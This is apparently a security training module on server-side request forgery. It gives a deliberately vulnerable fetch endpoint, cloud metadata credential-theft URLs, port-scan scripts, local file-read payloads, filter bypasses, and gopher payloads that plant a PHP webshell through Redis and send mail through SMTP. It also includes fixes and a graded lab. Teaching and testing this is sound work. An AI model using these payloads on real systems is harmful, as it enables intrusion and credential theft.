# Module 8: Server-Side Request Forgery (SSRF)

Server-Side Request Forgery occurs when an application fetches a resource from a URL provided by the user, and the server makes the request on behalf of the user. The attacker manipulates the URL to make the server request internal resources, cloud metadata endpoints, or other services that should not be accessible from the internet. SSRF is one of the most impactful vulnerability classes in modern cloud environments because it bridges the gap between external web applications and internal infrastructure.

## The Mechanics of SSRF

A basic SSRF vulnerability exists when an application accepts a URL from the user and fetches it server-side:

```python
import requests

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    response = requests.get(url)  # SSRF vulnerability
    return response.text
```

The intended use might be a URL preview feature, a webhook tester, or an image proxy. The attacker provides an internal URL:

```
http://169.254.169.254/latest/meta-data/
```

The server fetches the AWS instance metadata endpoint and returns the response, including IAM credentials, instance ID, and other sensitive information.

SSRF is not limited to HTTP. The URL can use any protocol the server's HTTP library supports:

- `http://` and `https://`: Standard web requests
- `file:///`: Local file access (file:// protocol)
- `gopher://`: Raw TCP connection (extremely powerful for interacting with internal services)
- `dict://`: Dictionary protocol (used to interact with Redis, memcached)
- `sftp://`: SSH file transfer
- `ldap://`: LDAP queries
- `tftp://`: Trivial file transfer

The impact of SSRF depends on the application's network position. A web application in a DMZ with access to internal databases, authentication services, and cloud metadata can be exploited to compromise the entire internal network. A web application with no internal network access has limited SSRF impact (file read and external port scanning only).

## Internal Network Scanning

SSRF enables port scanning of the internal network from the web application:

```
http://internal-server:8080/api/health
http://internal-server:8443/api/health
http://internal-server:3306/  (MySQL)
http://internal-server:5432/  (PostgreSQL)
http://internal-server:6379/  (Redis)
http://internal-server:27017/ (MongoDB)
```

By varying the port number and observing the response (or response time), the attacker maps the internal network:

- **Open port**: The server returns a response (even an error response indicates the port is open).
- **Closed port**: The connection is refused or times out.
- **Filtered port**: The connection times out without any response.

A faster approach uses HTTP keep-alive and connection timing:

```python
import requests
import time

def scan_port(host, port, timeout=2):
    try:
        start = time.time()
        requests.get(f'http://{host}:{port}/', timeout=timeout)
        return time.time() - start
    except:
        return None

for port in range(1, 65536):
    result = scan_port('10.0.1.100', port)
    if result is not None:
        print(f'Port {port}: open (response time: {result:.2f}s)')
```

The scanning approach varies based on the application's behavior. If the application returns different responses for open vs closed ports (connection error vs HTTP response), status code analysis is sufficient. If the application returns the same error for both, timing analysis is necessary: open ports typically respond faster than closed ports because the connection handshake completes.

Common internal services to scan for:

- **Port 22**: SSH: may allow credential brute force
- **Port 3306**: MySQL: may have weak credentials
- **Port 5432**: PostgreSQL: may have weak credentials
- **Port 6379**: Redis: often unauthenticated
- **Port 8080/8443**: Internal web applications: may have weaker security controls
- **Port 27017**: MongoDB: often unauthenticated
- **Port 9200**: Elasticsearch: may expose sensitive data
- **Port 2181**: ZooKeeper: may expose configuration data
- **Port 8500**: Consul: may expose service discovery data

## Cloud Metadata Exploitation

Cloud providers assign metadata services to instances for configuration, credentials, and status information. These services are accessible from within the instance at well-known IP addresses:

### AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

The metadata service returns:

- Instance ID, type, region
- IAM role name and temporary credentials (access key, secret key, session token)
- User data (often containing database passwords, API keys)
- Network configuration
- Security group information

The IAM credentials are the most critical. If the instance has an IAM role with broad permissions (S3 read access, DynamoDB access, SQS access), the attacker can use the credentials to access any resource the role is authorized for.

**AWS IMDSv2**: AWS introduced Instance Metadata Service v2 (IMDSv2) to mitigate SSRF attacks on metadata. IMDSv2 requires a PUT request with a token header:

```bash
# Get token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

IMDSv2 blocks simple SSRF because the attacker must first make a PUT request to obtain a token, which requires the ability to set custom headers. However, if the SSRF allows header manipulation or if the application uses a library that supports PUT requests, IMDSv2 can still be bypassed.

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

GCP metadata requires the header `Metadata-Flavor: Google`. Without this header, the request is rejected. However, many SSRF exploitation techniques allow setting custom headers.

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```

Azure metadata requires the header `Metadata: true`. Azure Managed Identities provide tokens for accessing Azure services (Storage, Key Vault, SQL Database).

## Port Scanning via SSRF

A refined port scanning technique uses HTTP response times and status codes to determine port status:

```python
import requests
from concurrent.futures import ThreadPoolExecutor

def check_port(target, port):
    url = f'http://{target}:{port}/'
    try:
        response = requests.get(url, timeout=3, allow_redirects=False)
        return port, 'open', response.status_code
    except requests.exceptions.ConnectionRefused:
        return port, 'closed', None
    except requests.exceptions.Timeout:
        return port, 'filtered', None
    except Exception as e:
        return port, 'error', str(e)

# Scan common ports through SSRF
common_ports = [21, 22, 25, 53, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(check_port, '10.0.1.0', port) for port in common_ports]
    for future in futures:
        port, status, detail = future.result()
        print(f'Port {port}: {status} ({detail})')
```

The SSRF URL changes for each port:

```
http://target.com/fetch?url=http://10.0.1.0:22/
http://target.com/fetch?url=http://10.0.1.0:80/
http://target.com/fetch?url=http://10.0.1.0:3306/
```

Response time analysis is more reliable than status codes because the application may return the same response regardless of port status. A closed port typically returns a connection error quickly, while an open port returns a response (or times out waiting for a response).

## File Protocol for Local File Read

The `file://` protocol allows reading local files through SSRF:

```
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///etc/shadow
http://target.com/fetch?url=file:///proc/self/environ
http://target.com/fetch?url=file:///proc/self/cmdline
http://target.com/fetch?url=file:///var/log/apache2/access.log
```

On Windows:

```
http://target.com/fetch?url=file:///c:/windows/win.ini
http://target.com/fetch?url=file:///c:/windows/system32/drivers/etc/hosts
```

The file protocol works in Python requests, cURL, PHP file operations, and many other HTTP libraries. It is often not disabled by default.

**Key files to read**:

- `/etc/passwd`: User account information
- `/etc/shadow`: Password hashes (if permissions allow)
- `/etc/hosts`: Hostname resolution
- `/proc/self/environ`: Environment variables (may contain secrets)
- `/proc/self/cmdline`: Command line arguments
- `/var/log/auth.log`: Authentication logs
- Application configuration files
- SSH keys (`~/.ssh/id_rsa`)
- Cloud user data scripts

## Bypass Techniques

### IP Obfuscation

When the application blocks specific IP addresses (like 169.254.169.254), the attacker uses encoding and alternative representations:

**Decimal IP**: `http://2852039166/` (equivalent to 169.254.169.254)
```python
# Convert IP to decimal
import struct, socket
ip = socket.inet_aton('169.254.169.254')
decimal = struct.unpack("!L", ip)[0]
print(decimal)  # 2852039166
```

**Hex IP**: `http://0xa9fea9fe/`
**Octal IP**: `http://0251.0376.0251.0376/`
**IPv6**: `http://[::ffff:a9fe:a9fe]/` or `http://[0:0:0:0:0:ffff:a9fe:a9fe]/`
**URL encoding**: `http://169.254.169.254%2f` or `http://169.254%2e169%2e254`
**Zero padding**: `http://169.254.0169.254/`

### DNS Rebinding

DNS rebinding attacks bypass SSRF protections by first resolving the domain to a safe IP (passing validation) and then resolving it to the internal target:

1. The attacker registers `evil.attacker.com` and points it to `1.2.3.4` (safe IP).
2. The application validates the URL: `evil.attacker.com` resolves to `1.2.3.4`, which passes the whitelist check.
3. The application makes the request: `evil.attacker.com` now resolves to `169.254.169.254` (metadata endpoint).
4. The DNS TTL expires and the domain is re-resolved to the internal target.

DNS rebinding works because many applications resolve the domain once for validation and again for the actual request. Setting a very low TTL (0 or 1 second) on the DNS record ensures rebinding occurs.

**Tools**: `rbndr.us` is a DNS rebinding service that generates domains with alternating DNS responses. First request returns the safe IP, second request returns the attacker-controlled IP.

### Redirect Bypass

If the application blocks certain URLs but follows redirects, the attacker can use an open redirect on a trusted domain:

```
http://target.com/fetch?url=http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

The application validates `trusted.com` (passes whitelist), fetches the URL, receives a redirect to the metadata endpoint, and follows it.

### Protocol Smuggling with Gopher

The `gopher://` protocol sends raw data to a TCP port. This enables interacting with internal services that speak text-based protocols:

**Redis command injection**:

```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%3F>%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

This sends a series of Redis commands through the gopher protocol:
1. Sets a key containing a PHP webshell
2. Configures Redis to save to `/var/www/html/shell.php`
3. Triggers a save, writing the webshell to disk

**SMTP email injection**:

```
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0d%0aRCPT%20TO%3A%3Cvictim%40target.com%3E%0d%0aDATA%0d%0aSubject%3A%20SSRF%20Email%0d%0a%0d%0aThis%20email%20was%20sent%20via%20SSRF%0d%0a.%0d%0aQUIT
```

This sends a complete SMTP transaction through the gopher protocol, crafting and delivering an email.

## Real Scenario: Stealing AWS Credentials via SSRF

A SaaS application provided a URL preview feature. Users could enter a URL, and the application would fetch the page, extract the title and description, and display a preview card. The feature was designed for social media link previews.

**The vulnerability**: The URL preview endpoint accepted any URL and fetched it server-side:

```
GET /api/preview?url=https://example.com
```

The application returned:

```json
{
  "title": "Example Domain",
  "description": "This domain is for use in illustrative examples...",
  "image": "https://example.com/logo.png"
}
```

**The exploitation**: The tester first tested for basic SSRF:

```
GET /api/preview?url=http://169.254.169.254/latest/meta-data/
```

The application returned:

```json
{
  "title": "ami-id",
  "description": "ami-0abcdef1234567890",
  "image": null
}
```

The metadata endpoint was accessible. The tester then enumerated the IAM role:

```
GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Response: `app-role-production`

```
GET /api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/app-role-production
```

Response:

```json
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T10:30:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "FwoGZXIvYXdzEBY...",
  "Expiration": "2024-01-15T16:30:00Z"
}
```

The IAM role had the `AmazonS3ReadOnlyAccess` policy attached, granting read access to all S3 buckets in the account.

**The impact**: Using the stolen credentials, the tester:

1. Listed all S3 buckets: `aws s3 ls`
2. Downloaded customer data from a bucket named `customer-exports-2024`
3. Downloaded database backups from a bucket named `prod-backups`
4. Accessed application configuration from a bucket named `app-config`
5. Read CloudWatch logs revealing internal API calls and database queries

**The data exposed**:

- 50,000 customer records (names, emails, phone numbers, addresses)
- 200 database backup files containing full application data
- Application configuration including database credentials, API keys, and encryption keys
- Internal documentation describing the application architecture

**The root cause**: The URL preview feature did not restrict which URLs could be fetched. The application ran on an AWS instance with an IAM role that had broader permissions than necessary (S3 read access to all buckets rather than specific buckets).

**The fix**:

1. Restrict URL fetching to HTTP/HTTPS only (disable file://, gopher://, etc.).
2. Implement a URL whitelist for approved domains.
3. Block requests to private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16).
4. Implement IMDSv2 on the AWS instance.
5. Follow the principle of least privilege for IAM roles: grant access only to specific buckets needed for the application's function.
6. Deploy network-level controls (security groups, NACLs) to restrict which internal services can be reached from the application tier.

## Practical Exercise: SSRF Lab

1. **Basic SSRF**: Find the URL fetch feature. Test with internal URLs (localhost, 127.0.0.1, 10.0.0.1). Document which internal resources are accessible.

2. **Cloud metadata**: If the application runs in a cloud environment, attempt to access the metadata service. Extract IAM credentials, instance information, and user data.

3. **Port scanning**: Use SSRF to scan internal ports. Identify open services on the internal network. Map the internal topology.

4. **File read**: Attempt to read local files using the file:// protocol. Target configuration files, environment variables, and sensitive system files.

5. **Bypass testing**: If the application blocks certain IPs or URLs, attempt bypass using IP obfuscation, redirects, DNS rebinding, or protocol smuggling.

6. **Protocol interaction**: If gopher:// is available, attempt to interact with internal services (Redis, SMTP, memcached). Document the commands sent and responses received.

Time limit: 60 minutes. Grading criteria: basic SSRF identification (15%), cloud metadata exploitation (25%), port scanning (15%), file read (15%), bypass techniques (20%), documentation (10%).
